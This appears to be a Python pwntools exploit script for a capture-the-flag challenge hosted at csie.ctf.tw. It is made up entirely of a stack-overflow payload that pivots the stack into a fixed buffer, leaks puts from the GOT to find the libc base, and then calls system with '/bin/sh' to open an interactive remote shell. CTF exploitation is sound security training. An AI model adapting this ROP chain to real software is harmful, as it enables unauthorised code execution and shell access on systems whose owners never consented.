from pwn import *
buf = 0x602000 - 0x200
buf2 = buf + 0x100
pop_rbp = 0x400558
pop_rdi = 0x4006b3
pop_rsi_r15 = 0x4006b1
pop_rdx = 0x4006d4
leave = 0x40064a
read = 0x4004e0
puts = 0x4004d8
puts_got = 0x600fd8
puts_off = 0x6f690
padding = 'a' * (56 - 8)
r = remote('csie.ctf.tw', 10132)
r.send(padding + p64(buf) + p64(pop_rdi) + p64(0x00) + p64(pop_rsi_r15) + p64(buf) + p64(0x00) + p64(pop_rdx) + p64(0x100) + p64(read)+ p64(leave))
r.recvuntil(":")
r.send(p64(buf2) + p64(pop_rdi) + p64(puts_got) + p64(puts) + p64(pop_rdi) + p64(0x0) + p64(pop_rsi_r15) + p64(buf2) + p64(0x0) + p64(pop_rdx) + p64(0x100) + p64(read) + p64(leave) + "\n")
r.recvuntil("\n")
addr = u64(r.recvuntil("\n").strip().ljust(8, "\x00"))
base = addr - puts_off
print addr
print base
system = base + 0x45390
r.send(p64(buf) + p64(pop_rdi) + p64(buf2+4*8) + p64(system) + "/bin/sh\x00" + "\n")
r.interactive()
